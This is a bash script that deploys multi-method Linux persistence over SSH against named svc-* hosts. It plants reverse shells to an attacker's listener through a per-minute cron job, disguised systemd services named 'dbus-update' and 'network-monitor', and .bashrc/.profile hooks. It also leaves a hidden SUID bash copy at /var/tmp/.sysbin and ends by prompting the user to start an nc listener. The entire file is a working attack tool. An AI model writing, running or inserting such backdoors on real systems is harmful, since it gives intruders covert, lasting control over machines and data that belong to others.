#!/bin/bash
# linux_persist.sh — Multi-method Linux persistence deployer
# Targets: svc-ftp-01, svc-redis-01, svc-database-01, svc-amazin-01, svc-samba-01
# Usage: ./linux_persist.sh <target_ip> <username> [lhost] [lport]
# Methods: cron backdoor, systemd service, SUID bash copy, .bashrc hook

set -euo pipefail

TARGET="${1:?Usage: $0 <ip> <user> [lhost] [lport]}"
USER="${2:?}"
LHOST="${3:-$(hostname -I | awk '{print $1}')}"
LPORT="${4:-4444}"

# Prompt for password
read -rsp $'\033[0;36m[?]\033[0m SSH password for '"${USER}@${TARGET}"': ' PASS
echo

SSH_OPTS=(-o StrictHostKeyChecking=no -o ConnectTimeout=5
          -o PreferredAuthentications=password -o PubkeyAuthentication=no -o BatchMode=no)

# Helper: run remote command via sshpass
rexec() {
    sshpass -p "$PASS" ssh "${SSH_OPTS[@]}" "${USER}@${TARGET}" "$@"
}

rsend() {
    sshpass -p "$PASS" scp -o StrictHostKeyChecking=no \
        -o PreferredAuthentications=password -o PubkeyAuthentication=no \
        "$1" "${USER}@${TARGET}:$2"
}

echo "[*] === Linux Persistence Deployer ==="
echo "[*] Target : $TARGET"
echo "[*] User   : $USER"
echo "[*] LHOST  : $LHOST:$LPORT"
echo ""

# ── Method 1: Cron reverse shell ─────────────────────────────────────────────
echo "[*] [1/4] Installing cron persistence..."
CRON_PAYLOAD="* * * * * /bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' 2>/dev/null"
rexec "
    # User crontab (always available)
    (crontab -l 2>/dev/null | grep -v '${LHOST}'; echo '${CRON_PAYLOAD}') | crontab -
    echo '[+] User cron installed'
    # System-wide if root
    if sudo -n true 2>/dev/null; then
        echo '${CRON_PAYLOAD}' | sudo tee /etc/cron.d/sysupdate > /dev/null
        sudo chmod 644 /etc/cron.d/sysupdate
        echo '[+] System cron /etc/cron.d/sysupdate installed'
    fi
" && echo "[+] Cron persistence installed"

# ── Method 2: Systemd user service ───────────────────────────────────────────
echo "[*] [2/4] Installing systemd persistence..."
rexec "
    mkdir -p ~/.config/systemd/user
    cat > ~/.config/systemd/user/dbus-update.service <<'SVC_EOF'
[Unit]
Description=D-Bus Session Update
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'
Restart=on-failure
RestartSec=30

[Install]
WantedBy=default.target
SVC_EOF
    systemctl --user daemon-reload 2>/dev/null || true
    systemctl --user enable dbus-update.service 2>/dev/null || true
    systemctl --user start dbus-update.service 2>/dev/null || true
    echo '[+] User systemd service installed'

    # System-level if sudo available
    if sudo -n true 2>/dev/null; then
        sudo bash -c \"cat > /etc/systemd/system/network-monitor.service <<'SVC_EOF2'
[Unit]
Description=Network Stack Monitor
After=network-online.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1'
Restart=always
RestartSec=60

[Install]
WantedBy=multi-user.target
SVC_EOF2\"
        sudo systemctl daemon-reload
        sudo systemctl enable network-monitor.service
        sudo systemctl start network-monitor.service
        echo '[+] System systemd service installed'
    fi
" && echo "[+] Systemd persistence installed"

# ── Method 3: SUID copy of bash (root only) ──────────────────────────────────
echo "[*] [3/4] Attempting SUID bash copy..."
rexec "
    if sudo -n true 2>/dev/null; then
        sudo cp /bin/bash /var/tmp/.sysbin
        sudo chmod 4755 /var/tmp/.sysbin
        echo '[+] SUID bash at /var/tmp/.sysbin — run with: /var/tmp/.sysbin -p'
    else
        echo '[-] No sudo — skipping SUID bash'
    fi
" || echo "[-] SUID bash skipped (no root)"

# ── Method 4: .bashrc / .profile hook ────────────────────────────────────────
echo "[*] [4/4] Installing shell RC hook..."
HOOK="nohup bash -c 'bash -i >& /dev/tcp/${LHOST}/${LPORT} 0>&1' &>/dev/null &"
rexec "
    # Only add if not already present
    if ! grep -q '${LHOST}' ~/.bashrc 2>/dev/null; then
        echo '' >> ~/.bashrc
        echo '# system update hook' >> ~/.bashrc
        echo '${HOOK}' >> ~/.bashrc
        echo '[+] .bashrc hook installed'
    fi
    if ! grep -q '${LHOST}' ~/.profile 2>/dev/null; then
        echo '' >> ~/.profile
        echo '${HOOK}' >> ~/.profile
        echo '[+] .profile hook installed'
    fi
" && echo "[+] Shell RC hooks installed"

echo ""
echo "[*] === Summary ==="
echo "    Cron    : fires every minute to $LHOST:$LPORT"
echo "    Systemd : dbus-update.service / network-monitor.service"
echo "    SUID    : /var/tmp/.sysbin -p  (if root obtained)"
echo "    RC hook : triggers on next interactive login"
echo ""
echo "[!] Start listener: nc -lvnp $LPORT"
